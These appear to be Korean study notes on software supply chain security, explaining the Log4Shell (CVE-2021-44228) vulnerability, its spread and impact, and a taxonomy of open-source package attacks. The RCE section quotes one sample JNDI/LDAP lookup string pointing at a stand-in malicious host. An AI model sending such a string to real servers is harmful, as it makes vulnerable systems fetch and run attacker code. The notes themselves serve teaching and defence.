
## Supply Chain

공급망: 전체 프로세스에 관여되는 모든 비즈니스의 집합.


### Supply Chain in Software Ecosystem

![Figure 1](SoftwareSupplyChainSecurity_1.png)

- Modern software is not built from scrath.
- 프로그램을 만들 때, 여러 개의 오픈소스 라이브러리와 프레임워크에 의존한다(**dependencies**).


### Inheritance of Vulnerabilities

어떤 취약점이나 악성 코드가 존재할 때, 다음과 같은 복잡한 *dependency(종속성)* 의 구조를 가지고 있기 때문에 내부적으로 상속되는 문제가 발생한다.

![Figure 2](SoftwareSupplyChainSecurity_2.png)


### Example: Log4j

- **Log4j**  
	Apache Software Foundation에서 개발된 프레임워크로, 로깅을 해주는 라이브러리이다. 웹서버를 운영할 때, 발생하는 여러 가지 중요한 정보를 **로그 형태로 보관**한다.


### CVE-2021-44228 (Log4Shell)

  
2021년도에 **CVE**(Common Vulnerabilities and Exposures)가 발행되었다.

![Figure 3](SoftwareSupplyChainSecurity_3.png)

① 공격자가 자신의 서버를 만들고, **malware**나 **ransomware**를 올려놓는다.
② 해당 서버의 **URL을 포함시킨 쿼리**(http request)를 Log4j를 사용한 서버에 보낸다.
③ Log4j는 악성코드를 실행시키게 되고, 받은 서버 측이 malware/ransomware에 감염되는 문제가 발생한다.
→ **RCE(Remote Code Execution)**: 주소가 다른 악성코드를 받아서 실행시키는 형태의 공격 기법


### RCE (Remote Code Execution)

- 공격자는 **유해한 인풋(harmful input)**을 서버에 주고, 인풋을 실제로 웹서버에서 강제로 실행되도록 만든다.
- 인풋은 `jnndi:ldap://malicious.server.com/evil` 형태로 되어 있으며, Log4j를 사용하는 서버에서는 JNDI의 기능을 이용해서 **LDAP 서버**(공격자가 악성코드를 올려 놓은 서버)에서 제공하는 기능을 받아 실행시키도록 인식한다.
- Log4Shell + malware or Log4Shell + ransomware


### Impacts

![Figure 4](SoftwareSupplyChainSecurity_4.png)

- 보안 업체 관측 결과, 시간 당 최소 140만회의 공격 트래픽이 발생했다.
- CVE 발행 후 4개월이 지난 뒤에 조사한 결과, 여전히 90,000개 이상의 서버가 Log4j가 업데이트 되지 않은 버전을 사용 중이다.
- 구글 조사에 따르면, 17,840개의 패키지가 Log4j를 사용하는데 그 중 7,140개만 업데이트가 되었다.
- 직접적으로 사용하지 않더라도, 종속적으로 Log4j를 포함한 패키지를 사용하는 것만으로 랜섬웨어 감염 위험이 존재한다.
- Maven Central Java application repository에서 제공되는 36%의 Log4j 다운로드가 여전히 취약한 버전의 Log4j를 포함 중이다.

---
## OSS Security


### Open-Source Software (OSS) Attacks

- OSS(오픈 소스 소프트웨어)는 기술 스택 전반과 소프트웨어 개발 생애 주기 전반에 걸쳐 조직과 개인에 의해 널리 사용된다.
- Downstream consumer들은 특정 프로젝트의 보안 관행에 대해 통제권이 없고, **제한된 가시성**만을 가진다.
- 따라서, 공격자들은 **Supply chain에 진입**함으로써 악성코드 주입을 목적으로 한다(취약점 악용, 악성코드 유포).
- 감염된 소프트웨어가 사용자들에 의해 다운로드 받고 실행되어질 때, 공격자가 넣어 놓은 악성코드가 실행되어 시스템을 망가뜨리고 정보 탈취, 랜섬웨어로 봉쇄하는 등의 기능을 한다.
- 공격자의 공격은 소프트웨어/라이브러리 뿐만 아니라 **오픈소스 형태로 공유되고 있는 어떠한 산출물**이라도 공격의 대상이 될 수 있다(e.g., 워드 프로세서).


### OSS Attack Taxonomy (1)

- **Develop and Advertise Distinct Malicious Package from Scratch**  
	- 공격자가 자신만의 사용자가 원하는 기능을 담은 새로운 OSS 프로젝트를 만들어 악성코드를 넣어 놓고 키우고 유포하는 것이다. 
	- 실제 예: PyPI, npm, Docker Hub, NuGet


### OSS Attack Taxonomy (2)

- **Create Name Confusion with Legitimate Package**  
	- 공격자가 자신의 악성코드 프로젝트를 만들 때, **합법적인 라이브러리의 이름을 따서 비슷하게 네이밍**한다.  
	- 비용이 저렴하다.  
	- 기법: Combosquatting (pre or post-fixes), word orders, word separators


### OSS Attack Taxonomy (3)

- **Subvert Legitimate Package**  
	- 이미 존재하는 합법적인 프로젝트를 감염시킨다.  
	- **Inject into Sources Legitimate Package**: 악성코드를 실제 프로젝트의 코드 베이스에 집어 넣는다. 소스코드 자체가 감염되는 것이기 때문에 가장 영향력이 커진다.  
	- **Inject during the Build of Legitimate Package**: pre-built components(e.g., Maven or Gradle)에 개입하여 악성코드를 넣는다. 영향력은 제한적이지만, 탐지하는 것은 어려워진다.  
	- **Distribute Malicious Version of Legitimate Package**: 미러되어 있는 서버 혹은 CDN 자체에 칩입하여 악성코드를 유포한다. 모든 유저는 아니더라도, 시스템 유저에게는 충분한 영향을 미친다.  
	- **Dangling References**: 관리되지 않는 프로젝트(orphaned projects)에 Man-in-the-Middle 공격, DNS cache poisoning 등으로 공격한다. 외부 라이브러리를 사용하는 프로젝트가, 포함되어 있는 configuration 되어 있는 서버로부터 다른 라이브러리를 로드하는 형태일 때, 이 과정에 개입하여서 **악성코드를 받아오도록/공격자의 서버에 접속하도록** 한다.